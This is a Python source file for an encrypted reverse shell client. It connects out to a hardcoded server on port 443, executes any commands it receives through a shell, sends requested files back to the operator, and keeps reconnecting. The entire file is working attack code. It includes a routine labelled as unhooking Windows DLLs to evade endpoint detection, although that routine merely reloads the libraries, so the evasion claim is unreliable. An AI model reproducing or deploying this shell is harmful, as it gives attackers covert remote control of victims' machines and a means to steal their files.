#!/usr/bin/env python3
# aes_reverse_shell_enhanced.py
import socket
import subprocess
import sys
import os
import time
import ctypes
from cryptography.fernet import Fernet

# --- AES Configuration ---
AES_KEY = b'jr8sI1WrJqL_5QyUe6j6H8V9g9vPKQO9v8lfdWpzhqk='
cipher_suite = Fernet(AES_KEY)

# Hardcoded Configuration
SERVER_IP = "192.168.0.52"
SERVER_PORT = 443

# Global session state
current_directory = os.getcwd()

def unhook_dll(dll_name):
    """Attempt to unhook DLL to bypass EDR hooks"""
    try:
        system32 = os.path.join(os.environ['WINDIR'], 'System32')
        original_dll = os.path.join(system32, dll_name)
        
        ctypes.windll.kernel32.LoadLibraryW.restype = ctypes.c_void_p
        ctypes.windll.kernel32.LoadLibraryW.argtypes = [ctypes.c_wchar_p]
        dll_handle = ctypes.windll.kernel32.LoadLibraryW(original_dll)
        
        if dll_handle:
            print(f"[+] Successfully unhooked {dll_name}")
            return dll_handle
    except Exception as e:
        print(f"[-] Failed to unhook {dll_name}: {e}")
    return None

def execute_command(command):
    """Execute command with session-aware context"""
    global current_directory
    
    try:
        print(f"[DEBUG] Executing command: {command}")
        print(f"[DEBUG] Current directory: {current_directory}")
        
        # Handle special commands that need session context
        if command.lower().startswith('cd '):
            new_dir = command[3:].strip()
            try:
                if not os.path.isabs(new_dir):
                    new_dir = os.path.join(current_directory, new_dir)
                os.chdir(new_dir)
                current_directory = os.getcwd()
                return f"Changed directory to: {current_directory}".encode('utf-8', 'ignore')
            except Exception as e:
                return f"Error changing directory: {e}".encode('utf-8', 'ignore')
        
        elif command.lower() == 'pwd' or command.lower() == 'cwd':
            return f"Current directory: {current_directory}".encode('utf-8', 'ignore')
        
        elif command.lower().startswith('download '):
            # Handle file download requests
            file_path = command[9:].strip()
            if not os.path.isabs(file_path):
                file_path = os.path.join(current_directory, file_path)
            
            if os.path.exists(file_path):
                try:
                    with open(file_path, 'rb') as f:
                        file_data = f.read()
                    return b"FILE_DATA:" + file_data
                except Exception as e:
                    return f"Error reading file: {e}".encode('utf-8', 'ignore')
            else:
                return f"File not found: {file_path}".encode('utf-8', 'ignore')
        
        # Execute regular commands in the current directory
        process = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE,
            cwd=current_directory,
            text=False  # Ensure binary output
        )
        
        # Use communicate() to avoid deadlocks
        stdout, stderr = process.communicate()
        output = stdout + stderr
        
        print(f"[DEBUG] Command output length: {len(output)}")
        return output
        
    except Exception as e:
        error_msg = f"Error executing command: {e}".encode('utf-8', 'ignore')
        print(f"[DEBUG] Error: {error_msg}")
        return error_msg

def send_encrypted(sock, data):
    """Encrypts and sends data with length prefix"""
    try:
        if isinstance(data, str):
            data = data.encode('utf-8', 'ignore')
        
        encrypted_data = cipher_suite.encrypt(data)
        length_prefix = len(encrypted_data).to_bytes(4, byteorder='big')
        sock.send(length_prefix + encrypted_data)
        print(f"[DEBUG] Sent {len(data)} bytes (encrypted: {len(encrypted_data)} bytes)")
        return True
    except Exception as e:
        print(f"[-] Send error: {e}")
        return False

def recv_encrypted(sock):
    """Receives and decrypts data with length prefix"""
    try:
        # Get length prefix
        length_data = sock.recv(4)
        if not length_data:
            print("[-] No length data received")
            return None
        
        encrypted_length = int.from_bytes(length_data, byteorder='big')
        print(f"[DEBUG] Expecting {encrypted_length} bytes of encrypted data")
        
        # Receive encrypted data
        encrypted_data = b''
        while len(encrypted_data) < encrypted_length:
            chunk = sock.recv(min(4096, encrypted_length - len(encrypted_data)))
            if not chunk:
                break
            encrypted_data += chunk
        
        if len(encrypted_data) != encrypted_length:
            print(f"[-] Received {len(encrypted_data)} bytes, expected {encrypted_length}")
            return None
        
        decrypted_data = cipher_suite.decrypt(encrypted_data)
        print(f"[DEBUG] Received and decrypted {len(decrypted_data)} bytes")
        return decrypted_data
        
    except Exception as e:
        print(f"[-] Receive error: {e}")
        return None

def connect_to_server():
    """Establish reverse connection"""
    global current_directory
    
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(60)  # Increased timeout
            
            print(f"[*] Connecting to {SERVER_IP}:{SERVER_PORT}")
            s.connect((SERVER_IP, SERVER_PORT))
            print("[+] Connection established")
            
            # EDR evasion attempts
            unhook_dll('ntdll.dll')
            unhook_dll('kernel32.dll')
            
            # Send welcome message with current directory
            welcome_msg = f"Reverse shell connected successfully!\nCurrent directory: {current_directory}"
            if not send_encrypted(s, welcome_msg):
                print("[-] Failed to send welcome message")
                s.close()
                time.sleep(5)
                continue
            
            # Main command loop
            while True:
                print("[DEBUG] Waiting for command...")
                encrypted_command = recv_encrypted(s)
                if encrypted_command is None:
                    print("[-] No command received or connection lost")
                    break
                
                try:
                    command = encrypted_command.decode('utf-8', 'ignore').strip()
                    print(f"[DEBUG] Received command: {command}")
                except Exception as e:
                    error_msg = f"Error decoding command: {e}"
                    print(f"[-] {error_msg}")
                    send_encrypted(s, error_msg)
                    continue

                if command.lower() in ['exit', 'quit']:
                    send_encrypted(s, "Closing connection...")
                    break
                
                if not command:
                    send_encrypted(s, "No command received")
                    continue
                
                # Execute command and send output
                output = execute_command(command)
                if not send_encrypted(s, output):
                    print("[-] Failed to send command output")
                    break
            
            s.close()
            print("[-] Connection closed, reconnecting in 5 seconds...")
            
        except ConnectionRefusedError:
            print("[-] Connection refused - is the server running?")
        except socket.timeout:
            print("[-] Connection timeout")
        except Exception as e:
            print(f"[-] Error: {e}")
        
        time.sleep(5)

if __name__ == "__main__":
    try:
        print("[*] Enhanced AES Reverse Shell Client Starting...")
        print(f"[*] Target: {SERVER_IP}:{SERVER_PORT}")
        connect_to_server()
    except KeyboardInterrupt:
        print("\n[!] Client stopped by user")
    except Exception as e:
        print(f"[-] Critical error: {e}")
        input("Press Enter to exit...")